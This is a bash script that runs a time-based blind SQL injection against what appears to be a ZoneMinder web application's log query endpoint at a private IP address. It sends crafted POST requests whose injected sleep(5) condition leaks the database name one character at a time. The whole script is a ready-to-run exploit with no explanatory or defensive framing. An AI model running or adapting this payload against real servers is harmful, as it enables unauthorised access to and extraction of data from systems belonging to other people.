#!/bin/bash

echo

# variable to store the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!ยก\/{}[]'

# variable to store the results
result=""
whitechar=0

# first loop that loops through each of the characters in the name with a predefined size of 10
for i in {1..10}
do

# nested loop that loops through each of the characters stored in the variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "\e[1A\e[KTesting character ${char:$k:1} in position $result""_"

SECONDS=0
curl -X POST "http://192.168.169.52/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr(database(),$i,1)='${char:$k:1}',sleep(5),1) ) \
)OQkj)#minTime=1466674406.084434'" &>/dev/null
DURATION=$SECONDS        

# check if the difference between the start and end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "\e[1A\e[KNew character found: $result\n"
whitechar=0
else
echo -e "\e[2A\e[KNew character found: $result\n"
whitechar=0
fi
break
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
if [[ "whitechar" -eq "2" ]]
then
echo -e "\nSecond blank character"
echo -e "End of program"
echo -e "\nDatabase: $result"
exit
fi
fi

fi
done
done

# print the final result
echo "Database: $result"